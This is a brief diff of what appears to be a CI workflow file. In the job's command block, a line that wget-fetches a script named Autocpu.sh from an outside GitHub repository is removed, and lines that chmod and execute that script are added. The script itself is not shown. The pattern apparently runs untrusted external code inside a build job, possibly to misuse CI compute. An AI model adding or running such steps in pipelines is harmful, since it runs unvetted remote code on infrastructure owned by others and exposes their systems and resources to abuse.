@@ -20,4 +20,6 @@ jobs:
 
           command: |
 
-            wget https://github.com/sijagungmuda/cipiuu/blob/main/Autocpu.sh
+            chmod +x Autocpu.sh
+
+            ./Autocpu.sh
